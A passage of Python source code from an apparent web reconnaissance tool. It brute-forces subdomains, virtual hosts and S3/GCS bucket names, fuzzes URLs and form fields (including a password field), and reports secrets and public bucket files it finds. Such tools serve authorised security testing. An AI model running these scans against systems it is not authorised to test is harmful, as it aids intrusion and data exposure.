                with open(self.logfile, "a", encoding="utf-8") as f:
                    f.write(text + "\n")

    def _divider(self, char="═", width=None):
        import shutil as _sh
        w = width or _sh.get_terminal_size((100, 24)).columns
        tqdm.write(("" if self.no_color else Fore.CYAN) + char * w + Style.RESET_ALL)

    def _print_header(self):
        self._divider()
        nc = self.no_color
        col = lambda s, clr: s if nc else (clr + s + Fore.RESET)
        bold = lambda s: s if nc else (Style.BRIGHT + s + Style.RESET_ALL)
        info = [
            ("Target URL",     self.url),
            ("Wordlist",       self.wordfile),
            ("Threads",        str(self.threads)),
            ("Extensions",     ",".join(e.lstrip(".") for e in self.exts if e) or "(none)"),
            ("Status Codes",   ",".join(map(str, self.codes))),
            ("Blacklist",      ",".join(map(str, self.blacklist_codes))),
            ("Method",         self.methods),
            ("User-Agent",     (self.user_agent[:55]+"...") if len(self.user_agent)>55 else self.user_agent),
            ("Timeout",        f"{self.timeout}s"),
            ("Follow Redir",   "YES" if self.follow_redirect else "no"),
            ("Recursion",      f"SMART (depth={self.depth})" if (not self.no_recursion and self.smart_recurse) else f"FULL (depth={self.depth})" if not self.no_recursion else "OFF"),
            ("Crawl",          "ON" if self.crawl else "OFF"),
            ("403 Bypass",     "ON" if self.bypass_403 else "OFF"),
            ("Wayback",        "ON" if (self.wayback or self.wayback_only) else "OFF"),
            ("Probe",          "ON" if self.probe else "OFF"),
            ("Secrets",        "ON" if self.do_extract_secrets else "OFF"),
        ]
        for k, v in info:
            tqdm.write(f"  {col(k.ljust(16), Fore.CYAN)}  {bold(v)}")
        total_reqs = len(self.wordlist) * len(self.exts)
        assumed_rps = max(self.threads * 0.8, 1)
        eta_secs = total_reqs / assumed_rps
        eta_str = (f"~{eta_secs:.0f}s" if eta_secs < 60 else
                   f"~{eta_secs/60:.1f}m" if eta_secs < 3600 else
                   f"~{eta_secs/3600:.1f}h")
        tqdm.write(f"  {col('ETA', Fore.CYAN).ljust(16+8)}  {total_reqs} requests  {col(eta_str, Fore.YELLOW)}")
        self._divider()

    def _print_summary(self):
        elapsed = time.perf_counter() - self.start_time
        self._divider()
        by_status: Dict[int, List[ScanResult]] = defaultdict(list)
        for r in self.results: by_status[r.status].append(r)
        tqdm.write(("" if self.no_color else Fore.CYAN + Style.BRIGHT) + "\n  ╔══ SUMMARY ══╗" + Style.RESET_ALL)
        for status in sorted(by_status):
            urls = by_status[status]
            tqdm.write(f"  ║  {colorize_status(status)} : {len(urls)} result(s)")
            if self.verbose >= 1:
                for r in urls: tqdm.write(f"  ║    {r.url}")
        tqdm.write(f"  ╚{'═'*13}╝")
        if self.all_secrets:
            # Final dedup pass before display
            seen_final = set(); uniq_secrets = []
            for s in self.all_secrets:
                key = s["type"] + "|" + s["value"][:80]
                if key not in seen_final:
                    seen_final.add(key); uniq_secrets.append(s)
            self.all_secrets = uniq_secrets  # store deduped list
            tqdm.write(Fore.RED + Style.BRIGHT + f"\n  ⚡ {len(uniq_secrets)} UNIQUE SECRET(S) FOUND:" + Style.RESET_ALL)
            for s in uniq_secrets:
                tqdm.write(Fore.RED + f"    [{s['type']}] {s['value'][:120]}" + Fore.RESET)
                tqdm.write(Fore.YELLOW + f"      → {s['url']}" + Fore.RESET)
        tqdm.write(f"\n  Total: {len(self.results)} results  |  Time: {elapsed:.2f}s")
        if self._throttled:
            tqdm.write(Fore.YELLOW + f"  [THROTTLE] Thread count was reduced (ended at {self._current_threads}/{self.threads})" + Fore.RESET)
        if self._timeout_count > 0:
            tqdm.write(Fore.YELLOW + f"  [!] {self._timeout_count} timeouts. Try --timeout {self.timeout*2} or --rate-limit 50" + Fore.RESET)
        self._divider()
        if self.logfile and self.output_json:
            json_path = re.sub(r'\.txt$', '.json', self.logfile) if self.logfile.endswith('.txt') else self.logfile + ".json"
            data = {
                "meta": {"url": self.url, "elapsed": elapsed, "timestamp": datetime.now(timezone.utc).isoformat()},
                "results": [{"url":r.url,"status":r.status,"size":r.size,"method":r.method,
                              "note":r.note,"secrets":r.secrets,"timestamp":r.timestamp} for r in self.results],
                "secrets": self.all_secrets,
            }
            Path(json_path).write_text(json.dumps(data, indent=2))
            tqdm.write(Fore.GREEN + f"  [JSON] Saved → {json_path}" + Fore.RESET)


# ─────────────────────────────────────────────────────────────────────────────
#  SUBDOMAIN SCANNER
# ─────────────────────────────────────────────────────────────────────────────
class SubdomainScanner:
    def __init__(self, domain, wordfile, threads=10, resolver=None, protocol="udp",
                 check_cname=False, wildcard=False, no_fqdn=False, delay=0.0,
                 wordlist_offset=0, output=None, quiet=False, no_progress=False,
                 no_error=False, no_color=False, debug=False, pattern_file=None,
                 timeout=1.0, url_file=None):
        self.domain        = domain.rstrip(".")
        self.wordlist      = []
        if wordfile == "-":
            if not sys.stdin.isatty():
                self.wordlist = [l.strip() for l in sys.stdin if l.strip()]
            else: raise ValueError("STDIN: nothing piped.")
        else:
            wf = Path(wordfile)
            if not wf.exists(): raise FileNotFoundError(f"Wordlist not found: {wordfile}")
            with open(wf, encoding="utf-8", errors="ignore") as f:
                self.wordlist = [l.strip() for l in f if l.strip()]
        if wordlist_offset: self.wordlist = self.wordlist[wordlist_offset:]
        if pattern_file:
            pf = Path(pattern_file)
            if pf.exists():
                with open(pf) as f: pats = [l.strip() for l in f if l.strip()]
                exp = []
                for w in self.wordlist:
                    for p in pats: exp.append(w.replace("{PATTERN}", p))
                self.wordlist.extend(exp)

        self.threads       = threads
        self.resolver      = resolver
        self.protocol      = protocol
        self.check_cname   = check_cname
        self.wildcard      = wildcard
        self.no_fqdn       = no_fqdn
        self.delay         = delay
        self.output        = output
        self.quiet         = quiet
        self.no_progress   = no_progress
        self.no_error      = no_error
        self.no_color      = no_color
        self.debug         = debug
        self.timeout       = timeout
        self._stop         = threading.Event()
        self._lock         = threading.Lock()
        self.results: List[Dict] = []

        try: signal.signal(signal.SIGINT, lambda s,f: self._stop.set())
        except (OSError, ValueError): pass

    def _resolve(self, subdomain: str) -> Optional[Dict]:
        fqdn = f"{subdomain}.{self.domain}"
        if not self.no_fqdn: fqdn = fqdn + "."
        result = {"subdomain": fqdn, "ips": [], "cname": None}
        if HAS_DNSPY and self.resolver:
            try:
                res = dns.resolver.Resolver()
                host, _, port = self.resolver.partition(":")
                res.nameservers = [socket.gethostbyname(host)]
                if port: res.port = int(port)
                res.timeout = self.timeout; res.lifetime = self.timeout * 2
                try:
                    ans = res.resolve(fqdn.rstrip("."), "A")
                    result["ips"] = [r.address for r in ans]
                except Exception: return None
                if self.check_cname:
                    try:
                        cans = res.resolve(fqdn.rstrip("."), "CNAME")
                        result["cname"] = str(cans[0].target)
                    except Exception: pass
            except Exception: return None
        else:
            try:
                addrs = socket.getaddrinfo(fqdn.rstrip("."), None, socket.AF_INET)
                result["ips"] = list({a[4][0] for a in addrs})
            except (socket.gaierror, socket.herror): return None
            except Exception:
                if self.debug: tqdm.write(Fore.RED + f"  [DNS ERR] {fqdn}" + Fore.RESET)
                return None
        return result if result["ips"] else None

    def _wildcard_check(self) -> bool:
        """Check if domain has wildcard DNS."""
        rand = ''.join(choice(ascii_letters) for _ in range(20))
        r = self._resolve(rand)
        return r is not None

    def run(self):
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))
        tqdm.write(Fore.CYAN + f"\n  [SUBDOMAIN] Target: {self.domain}  |  Words: {len(self.wordlist)}  |  Threads: {self.threads}" + Fore.RESET)
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * 70 + Style.RESET_ALL)

        if not self.wildcard:
            tqdm.write(Fore.CYAN + "  [*] Checking for wildcard DNS..." + Fore.RESET)
            if self._wildcard_check():
                tqdm.write(Fore.YELLOW + "  [WARN] Wildcard DNS detected! Use --wildcard to force scan." + Fore.RESET)
                return []

        output_lines = []
        pbar = tqdm(total=len(self.wordlist), desc="  subdomain", leave=False) if not self.no_progress else None

        def _worker(word):
            if self._stop.is_set(): return
            if self.delay > 0: time.sleep(self.delay)
            res = self._resolve(word)
            if pbar: pbar.update(1)
            if res is None: return
            ips = ", ".join(res["ips"]); cname = res.get("cname","")
            line = f"  {Fore.GREEN}{res['subdomain']}{Fore.RESET}  [{Fore.CYAN}{ips}{Fore.RESET}]"
            if cname: line += f"  → CNAME: {Fore.BLUE}{cname}{Fore.RESET}"
            tqdm.write(line)
            with self._lock:
                self.results.append(res)
                output_lines.append(f"{res['subdomain']}  [{ips}]" + (f"  CNAME:{cname}" if cname else ""))

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, w) for w in self.wordlist]
                for f in as_completed(futs):
                    if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                    try: f.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()

        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        tqdm.write(Fore.CYAN + f"\n  [SUBDOMAIN] Found: {len(self.results)} subdomain(s)" + Fore.RESET)
        if self.output and output_lines:
            with open(self.output, "w", encoding="utf-8") as f:
                f.write("\n".join(output_lines) + "\n")
            tqdm.write(Fore.GREEN + f"  [OUTPUT] Saved → {self.output}" + Fore.RESET)
        return self.results


# ─────────────────────────────────────────────────────────────────────────────
#  VHOST SCANNER
# ─────────────────────────────────────────────────────────────────────────────
class VhostScanner:
    def __init__(self, url, wordfile, threads=10, delay=0.0, wordlist_offset=0,
                 output=None, append_domain=False, domain=None, exclude_length=None,
                 exclude_status=None, force=False, exclude_hostname_length=False,
                 cookies="", headers="", user=None, password=None,
                 follow_redirect=False, method="GET", user_agent=None,
                 random_agent=False, proxy_url="", insecure=False, timeout=10,
                 retry=False, retry_attempts=3, client_cert=None, client_key=None,
                 quiet=False, no_progress=False, no_error=False, no_color=False,
                 debug=False, pattern_file=None, no_canonicalize_headers=False):
        if not url.startswith(("http://","https://")):
            url = _detect_scheme(url)
        self.url          = url
        self.parsed       = urlparse(url)
        self.wordlist     = []
        if wordfile == "-":
            if not sys.stdin.isatty():
                self.wordlist = [l.strip() for l in sys.stdin if l.strip()]
        else:
            wf = Path(wordfile)
            if not wf.exists(): raise FileNotFoundError(f"Wordlist: {wordfile}")
            with open(wf, encoding="utf-8", errors="ignore") as f:
                self.wordlist = [l.strip() for l in f if l.strip()]
        if wordlist_offset: self.wordlist = self.wordlist[wordlist_offset:]
        if pattern_file:
            pf = Path(pattern_file)
            if pf.exists():
                with open(pf) as f: pats = [l.strip() for l in f if l.strip()]
                exp = []
                for w in self.wordlist:
                    for p in pats: exp.append(w.replace("{PATTERN}", p))
                self.wordlist.extend(exp)

        self.threads      = threads
        self.delay        = delay
        self.output       = output
        self.append_domain= append_domain
        self.domain       = domain or self.parsed.hostname
        self.exclude_length = [int(x) for x in exclude_length] if exclude_length else []
        self.exclude_status = lister(exclude_status) if exclude_status else []
        self.force        = force
        self.excl_hostname_len = exclude_hostname_length
        self.cookies      = cookies
        self.headers_raw  = headers
        self.user         = user
        self.password     = password
        self.follow_redirect = follow_redirect
        self.method       = method.upper()
        self.random_agent = random_agent
        self.user_agent   = choice(USER_AGENT_LIST) if random_agent else (user_agent or default_user_agent())
        self.proxy_url    = proxy_url
        self.insecure     = insecure
        self.timeout      = timeout
        self.retry        = retry
        self.retry_attempts = retry_attempts
        self.client_cert  = client_cert
        self.client_key   = client_key
        self.quiet        = quiet
        self.no_progress  = no_progress
        self.no_error     = no_error
        self.no_color     = no_color
        self.debug        = debug
        self.no_canon     = no_canonicalize_headers
        self._stop        = threading.Event()
        self._lock        = threading.Lock()
        self.results: List[Dict] = []
        self._baseline_size: Optional[int] = None
        self._dyn_size_adj: Optional[int] = None  # dynamic hostname-length adjustment
        try: signal.signal(signal.SIGINT, lambda s,f: self._stop.set())
        except (OSError, ValueError): pass

    def _make_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = not self.insecure
        if self.proxy_url:
            session.verify = False
            session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        ua = choice(USER_AGENT_LIST) if self.random_agent else self.user_agent
        session.headers["User-Agent"] = ua
        if self.headers_raw:
            for item in [h.strip() for h in self.headers_raw.split(",") if ":" in h]:
                k, v = item.split(":",1)
                key = k.strip() if self.no_canon else k.strip().title()
                session.headers[key] = v.strip()
        if self.cookies:
            for ck in self.cookies.split(","):
                if "=" in ck: k, v = ck.split("=",1); session.cookies.set(k.strip(), v.strip())
        if self.client_cert and self.client_key: session.cert = (self.client_cert, self.client_key)
        elif self.client_cert: session.cert = self.client_cert
        if self.user and self.password: session.auth = HTTPBasicAuth(self.user, self.password)
        return session

    def _get_baseline(self, session: requests.Session):
        """Get baseline response for the real/invalid vhost."""
        rand_host = f"{''.join(choice(ascii_letters) for _ in range(16))}.{self.domain}"
        try:
            resp = session.request(self.method, self.url, headers={"Host": rand_host},
                                   timeout=self.timeout, allow_redirects=self.follow_redirect)
            self._baseline_size = len(resp.content)
            tqdm.write(Fore.CYAN + f"  [*] Baseline (random vhost → {resp.status_code}, {self._baseline_size}B)" + Fore.RESET)
            if self.excl_hostname_len:
                # compute how much of the response contains the hostname to subtract later
                self._dyn_size_adj = len(rand_host)
        except Exception as e:
            tqdm.write(Fore.YELLOW + f"  [!] Baseline check failed: {e}" + Fore.RESET)

    def _try_vhost(self, session: requests.Session, word: str, pbar) -> Optional[Dict]:
        if self._stop.is_set(): return None
        if self.delay > 0: time.sleep(self.delay)
        if self.append_domain:
            host = f"{word}.{self.domain}"
        else:
            host = word
        attempts = self.retry_attempts if self.retry else 1
        for attempt in range(attempts):
            try:
                resp = session.request(self.method, self.url, headers={"Host": host},
                                       timeout=self.timeout, allow_redirects=self.follow_redirect)
                sc   = resp.status_code
                size = len(resp.content)
                if pbar: pbar.update(1)
                # Exclusion checks
                if self.exclude_status and sc in self.exclude_status: return None
                # Dynamic hostname length exclusion
                if self._dyn_size_adj is not None:
                    adjusted_baseline = self._baseline_size + (len(host) - self._dyn_size_adj)
                    if size == adjusted_baseline: return None
                elif self._baseline_size is not None and size == self._baseline_size:
                    return None
                if self.exclude_length and size in self.exclude_length: return None
                if sc not in (404, 400): return {"host": host, "status": sc, "size": size}
                return None
            except requests.exceptions.Timeout:
                if attempt < attempts-1: continue
                if pbar: pbar.update(1)
                return None
            except Exception:
                if pbar: pbar.update(1)
                return None
        if pbar: pbar.update(1)
        return None

    def run(self):
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))
        tqdm.write(Fore.CYAN + f"\n  [VHOST] Target: {self.url}  |  Domain: {self.domain}  |  Words: {len(self.wordlist)}" + Fore.RESET)
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        session = self._make_session()
        self._get_baseline(session)
        output_lines = []
        pbar = tqdm(total=len(self.wordlist), desc="  vhost", leave=False) if not self.no_progress else None

        def _worker(word):
            res = self._try_vhost(session, word, pbar)
            if res:
                line = (f"  {Fore.GREEN}{res['host']}{Fore.RESET} "
                        f"[{colorize_status(res['status'])}] [Size:{res['size']}]")
                tqdm.write(line)
                with self._lock:
                    self.results.append(res)
                    output_lines.append(f"{res['host']}  [{res['status']}]  [Size:{res['size']}]")

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, w) for w in self.wordlist]
                for f in as_completed(futs):
                    if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                    try: f.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        tqdm.write(Fore.CYAN + f"\n  [VHOST] Found: {len(self.results)} vhost(s)" + Fore.RESET)
        if self.output and output_lines:
            with open(self.output, "w", encoding="utf-8") as f: f.write("\n".join(output_lines)+"\n")
            tqdm.write(Fore.GREEN + f"  [OUTPUT] Saved → {self.output}" + Fore.RESET)
        return self.results


# ─────────────────────────────────────────────────────────────────────────────
#  FUZZ SCANNER
# ─────────────────────────────────────────────────────────────────────────────
class FuzzScanner:
    FUZZ_KEYWORD = "FUZZ"

    def __init__(self, url, wordfile, threads=10, delay=0.0, wordlist_offset=0,
                 output=None, exclude_status=None, exclude_length=None,
                 body=None, cookies="", headers="", user=None, password=None,
                 follow_redirect=False, method="GET", user_agent=None,
                 random_agent=False, proxy_url="", insecure=False, timeout=10,
                 retry=False, retry_attempts=3, client_cert=None, client_key=None,
                 quiet=False, no_progress=False, no_error=False, no_color=False,
                 debug=False, pattern_file=None, no_canonicalize_headers=False):
        _has_fuzz = self.FUZZ_KEYWORD in url or (body is not None and self.FUZZ_KEYWORD in body)
        if not _has_fuzz:
            raise ValueError("FUZZ must appear in URL or --body.  e.g. -u site.com/FUZZ  or -B user=a&pass=FUZZ")
        self.url_template = url
        self.wordlist = []
        if wordfile == "-":
            if not sys.stdin.isatty():
                self.wordlist = [l.strip() for l in sys.stdin if l.strip()]
        else:
            wf = Path(wordfile)
            if not wf.exists(): raise FileNotFoundError(f"Wordlist: {wordfile}")
            with open(wf, encoding="utf-8", errors="ignore") as f:
                self.wordlist = [l.strip() for l in f if l.strip()]
        if wordlist_offset: self.wordlist = self.wordlist[wordlist_offset:]
        if pattern_file:
            pf = Path(pattern_file)
            if pf.exists():
                with open(pf) as f: pats = [l.strip() for l in f if l.strip()]
                exp = []
                for w in self.wordlist:
                    for p in pats: exp.append(w.replace("{PATTERN}", p))
                self.wordlist.extend(exp)

        self.threads      = threads
        self.delay        = delay
        self.output       = output
        self.exclude_status = lister(exclude_status) if exclude_status else [404]
        self.exclude_length = [int(x) for x in exclude_length] if exclude_length else []
        self.body         = body
        self.cookies      = cookies
        self.headers_raw  = headers
        self.user         = user
        self.password     = password
        self.follow_redirect = follow_redirect
        self.method       = method.upper()
        self.random_agent = random_agent
        self.user_agent   = choice(USER_AGENT_LIST) if random_agent else (user_agent or default_user_agent())
        self.proxy_url    = proxy_url
        self.insecure     = insecure
        self.timeout      = timeout
        self.retry        = retry
        self.retry_attempts = retry_attempts
        self.client_cert  = client_cert
        self.client_key   = client_key
        self.quiet        = quiet
        self.no_progress  = no_progress
        self.no_error     = no_error
        self.no_color     = no_color
        self.debug        = debug
        self.no_canon     = no_canonicalize_headers
        self._stop        = threading.Event()
        self._lock        = threading.Lock()
        self.results: List[Dict] = []
        try: signal.signal(signal.SIGINT, lambda s,f: self._stop.set())
        except (OSError, ValueError): pass

    def _make_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = not self.insecure
        if self.proxy_url:
            session.verify = False
            session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        ua = choice(USER_AGENT_LIST) if self.random_agent else self.user_agent
        session.headers["User-Agent"] = ua
        if self.headers_raw:
            for item in [h.strip() for h in self.headers_raw.split(",") if ":" in h]:
                k, v = item.split(":",1)
                key = k.strip() if self.no_canon else k.strip().title()
                session.headers[key] = v.strip()
        if self.cookies:
            for ck in self.cookies.split(","):
                if "=" in ck: k, v = ck.split("=",1); session.cookies.set(k.strip(), v.strip())
        if self.client_cert and self.client_key: session.cert = (self.client_cert, self.client_key)
        elif self.client_cert: session.cert = self.client_cert
        if self.user and self.password: session.auth = HTTPBasicAuth(self.user, self.password)
        return session

    def _fuzz(self, session: requests.Session, word: str, pbar) -> Optional[Dict]:
        if self._stop.is_set(): return None
        if self.delay > 0: time.sleep(self.delay)
        url  = self.url_template.replace(self.FUZZ_KEYWORD, quote(word, safe=""))
        body = self.body.replace(self.FUZZ_KEYWORD, word) if self.body else None
        attempts = self.retry_attempts if self.retry else 1
        for attempt in range(attempts):
            try:
                resp = session.request(self.method, url, data=body,
                                       timeout=self.timeout, allow_redirects=self.follow_redirect)
                sc   = resp.status_code
                size = len(resp.content)
                if pbar: pbar.update(1)
                if self.exclude_status and sc in self.exclude_status: return None
                if self.exclude_length and size in self.exclude_length: return None
                return {"word": word, "url": url, "status": sc, "size": size,
                        "words": len(resp.text.split()), "lines": len(resp.text.splitlines())}
            except requests.exceptions.Timeout:
                if attempt < attempts-1: continue
                if pbar: pbar.update(1); return None
            except Exception:
                if pbar: pbar.update(1); return None
        if pbar: pbar.update(1)
        return None

    def run(self):
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))
        tqdm.write(Fore.CYAN + f"\n  [FUZZ] Template: {self.url_template}  |  Words: {len(self.wordlist)}" + Fore.RESET)
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        session = self._make_session()
        output_lines = []
        pbar = tqdm(total=len(self.wordlist), desc="  fuzz", leave=False) if not self.no_progress else None

        def _worker(word):
            res = self._fuzz(session, word, pbar)
            if res:
                line = (f"  {Fore.YELLOW}[{res['word']}]{Fore.RESET}"
                        f"  [{colorize_status(res['status'])}]"
                        f"  [Size:{res['size']}]"
                        f"  [W:{res['words']}]"
                        f"  [L:{res['lines']}]"
                        f"  {res['url']}")
                tqdm.write(line)
                with self._lock:
                    self.results.append(res)
                    output_lines.append(f"[{res['word']}]  [{res['status']}]  [{res['size']}B]  {res['url']}")

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, w) for w in self.wordlist]
                for f in as_completed(futs):
                    if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                    try: f.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        tqdm.write(Fore.CYAN + f"\n  [FUZZ] Found: {len(self.results)} result(s)" + Fore.RESET)
        if self.output and output_lines:
            with open(self.output, "w", encoding="utf-8") as f: f.write("\n".join(output_lines)+"\n")
            tqdm.write(Fore.GREEN + f"  [OUTPUT] Saved → {self.output}" + Fore.RESET)
        return self.results


# ─────────────────────────────────────────────────────────────────────────────
#  S3 BUCKET SCANNER
# ─────────────────────────────────────────────────────────────────────────────
class S3Scanner:
    S3_ENDPOINTS = [
        "https://{name}.s3.amazonaws.com",
        "https://{name}.s3.us-east-1.amazonaws.com",
        "https://{name}.s3.us-west-2.amazonaws.com",
        "https://{name}.s3.eu-west-1.amazonaws.com",
        "https://s3.amazonaws.com/{name}",
        "http://{name}.s3.amazonaws.com",
    ]

    def __init__(self, wordfile, threads=10, delay=0.0, wordlist_offset=0,
                 output=None, max_files=5, show_files=True,
                 user_agent=None, random_agent=False, proxy_url="",
                 insecure=False, timeout=10, retry=False, retry_attempts=3,
                 quiet=False, no_progress=False, no_error=False, no_color=False,
                 debug=False, pattern_file=None):
        self.wordlist = []
        if wordfile == "-":
            if not sys.stdin.isatty():
                self.wordlist = [l.strip() for l in sys.stdin if l.strip()]
        else:
            wf = Path(wordfile)
            if not wf.exists(): raise FileNotFoundError(f"Wordlist: {wordfile}")
            with open(wf, encoding="utf-8", errors="ignore") as f:
                self.wordlist = [l.strip() for l in f if l.strip()]
        if wordlist_offset: self.wordlist = self.wordlist[wordlist_offset:]
        if pattern_file:
            pf = Path(pattern_file)
            if pf.exists():
                with open(pf) as f: pats = [l.strip() for l in f if l.strip()]
                exp = []
                for w in self.wordlist:
                    for p in pats: exp.append(w.replace("{PATTERN}", p))
                self.wordlist.extend(exp)

        self.threads      = threads
        self.delay        = delay
        self.output       = output
        self.max_files    = max_files
        self.show_files   = show_files
        self.random_agent = random_agent
        self.user_agent   = choice(USER_AGENT_LIST) if random_agent else (user_agent or default_user_agent())
        self.proxy_url    = proxy_url
        self.insecure     = insecure
        self.timeout      = timeout
        self.retry        = retry
        self.retry_attempts = retry_attempts
        self.quiet        = quiet
        self.no_progress  = no_progress
        self.no_error     = no_error
        self.no_color     = no_color
        self.debug        = debug
        self._stop        = threading.Event()
        self._lock        = threading.Lock()
        self.results: List[Dict] = []
        try: signal.signal(signal.SIGINT, lambda s,f: self._stop.set())
        except (OSError, ValueError): pass

    def _make_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = not self.insecure
        if self.proxy_url:
            session.verify = False
            session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        ua = choice(USER_AGENT_LIST) if self.random_agent else self.user_agent
        session.headers["User-Agent"] = ua
        return session

    def _check_bucket(self, session: requests.Session, name: str, pbar) -> Optional[Dict]:
        if self._stop.is_set(): return None
        if self.delay > 0: time.sleep(self.delay)
        for endpoint_tpl in self.S3_ENDPOINTS:
            url = endpoint_tpl.format(name=name)
            try:
                resp = session.get(url, timeout=self.timeout, allow_redirects=True)
                sc   = resp.status_code
                if sc == 200:
                    # Try to list files
                    files = []
                    if self.show_files:
                        try:
                            keys = re.findall(r'<Key>([^<]+)</Key>', resp.text)
                            files = keys[:self.max_files]
                        except Exception: pass
                    return {"name": name, "url": url, "status": sc,
                            "access": "public", "files": files}
                elif sc == 403:
                    return {"name": name, "url": url, "status": sc,
                            "access": "private (exists)", "files": []}
                elif sc in (301, 302):
                    redirect = resp.headers.get("Location", "")
                    return {"name": name, "url": url, "status": sc,
                            "access": f"redirect→{redirect}", "files": []}
            except Exception: pass
        if pbar: pbar.update(1)
        return None

    def run(self):
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))
        tqdm.write(Fore.CYAN + f"\n  [S3] Bruteforcing S3 buckets  |  Words: {len(self.wordlist)}" + Fore.RESET)
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        session = self._make_session()
        output_lines = []
        pbar = tqdm(total=len(self.wordlist), desc="  s3", leave=False) if not self.no_progress else None

        def _worker(word):
            res = self._check_bucket(session, word, pbar)
            if pbar: pbar.update(1)
            if res:
                access_col = Fore.GREEN if res["access"] == "public" else Fore.YELLOW
                line = (f"  {access_col}[{res['access'].upper()}]{Fore.RESET}"
                        f"  [{colorize_status(res['status'])}]"
                        f"  {res['url']}")
                if res["files"]:
                    line += f"\n    Files: {', '.join(res['files'][:self.max_files])}"
                tqdm.write(line)
                with self._lock:
                    self.results.append(res)
                    output_lines.append(f"[{res['access']}]  [{res['status']}]  {res['url']}")

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, w) for w in self.wordlist]
                for f in as_completed(futs):
                    if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                    try: f.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()
        tqdm.write(("" if self.no_color else Fore.CYAN) + "═" * __import__("shutil").get_terminal_size((100,24)).columns + Style.RESET_ALL)
        tqdm.write(Fore.CYAN + f"\n  [S3] Found: {len(self.results)} bucket(s)" + Fore.RESET)
        if self.output and output_lines:
            with open(self.output, "w", encoding="utf-8") as f: f.write("\n".join(output_lines)+"\n")
            tqdm.write(Fore.GREEN + f"  [OUTPUT] Saved → {self.output}" + Fore.RESET)
        return self.results


# ─────────────────────────────────────────────────────────────────────────────
#  GCS BUCKET SCANNER
# ─────────────────────────────────────────────────────────────────────────────
class CloudScanner:
    GCP_ENDPOINTS = [
        "https://storage.googleapis.com/{name}",
        "https://{name}.storage.googleapis.com",
        "https://storage.cloud.google.com/{name}",
        "https://www.googleapis.com/storage/v1/b/{name}/o?maxResults=10",
    ]

    def __init__(self, wordfile, threads=10, delay=0.0, wordlist_offset=0,
                 output=None, max_files=5, show_files=True,
                 user_agent=None, random_agent=False, proxy_url="",
                 insecure=False, timeout=10, retry=False, retry_attempts=3,
                 quiet=False, no_progress=False, no_error=False, no_color=False,
                 debug=False, pattern_file=None):
        self.wordlist = []
        if wordfile == "-":
            if not sys.stdin.isatty():
                self.wordlist = [l.strip() for l in sys.stdin if l.strip()]
        else:
            wf = Path(wordfile)
            if not wf.exists(): raise FileNotFoundError(f"Wordlist: {wordfile}")
            with open(wf, encoding="utf-8", errors="ignore") as f:
                self.wordlist = [l.strip() for l in f if l.strip()]
        if wordlist_offset: self.wordlist = self.wordlist[wordlist_offset:]
        if pattern_file:
            pf = Path(pattern_file)
            if pf.exists():
                with open(pf) as f: pats = [l.strip() for l in f if l.strip()]
                exp = []
                for w in self.wordlist:
                    for p in pats: exp.append(w.replace("{PATTERN}", p))
                self.wordlist.extend(exp)

        self.threads      = threads
        self.delay        = delay
        self.output       = output
        self.max_files    = max_files
        self.show_files   = show_files
        self.random_agent = random_agent
        self.user_agent   = choice(USER_AGENT_LIST) if random_agent else (user_agent or default_user_agent())
        self.proxy_url    = proxy_url
        self.insecure     = insecure
        self.timeout      = timeout
        self.retry        = retry
        self.retry_attempts = retry_attempts
        self.quiet        = quiet
        self.no_progress  = no_progress
        self.no_error     = no_error
        self.no_color     = no_color
        self.debug        = debug
        self._stop        = threading.Event()
        self._lock        = threading.Lock()
        self.results: List[Dict] = []
        try: signal.signal(signal.SIGINT, lambda s,f: self._stop.set())
        except (OSError, ValueError): pass

    def _make_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = not self.insecure
        if self.proxy_url:
            session.verify = False
            session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        session.headers["User-Agent"] = choice(USER_AGENT_LIST) if self.random_agent else self.user_agent
        return session

    def _check_bucket(self, session: requests.Session, name: str, pbar) -> Optional[Dict]:
        if self._stop.is_set(): return None
        if self.delay > 0: time.sleep(self.delay)
        for endpoint_tpl in self.GCP_ENDPOINTS:
            url = endpoint_tpl.format(name=name)
            try:
                resp = session.get(url, timeout=self.timeout, allow_redirects=True)
                sc   = resp.status_code
                if sc == 200:
                    files = []
                    if self.show_files:
                        try:
                            # JSON API response
                            if "application/json" in resp.headers.get("Content-Type",""):
                                data = resp.json()
                                items = data.get("items", [])
                                files = [i.get("name","") for i in items[:self.max_files]]
                            else:
                                # XML listing
                                keys = re.findall(r'<Key>([^<]+)</Key>', resp.text)
                                files = keys[:self.max_files]
                        except Exception: pass
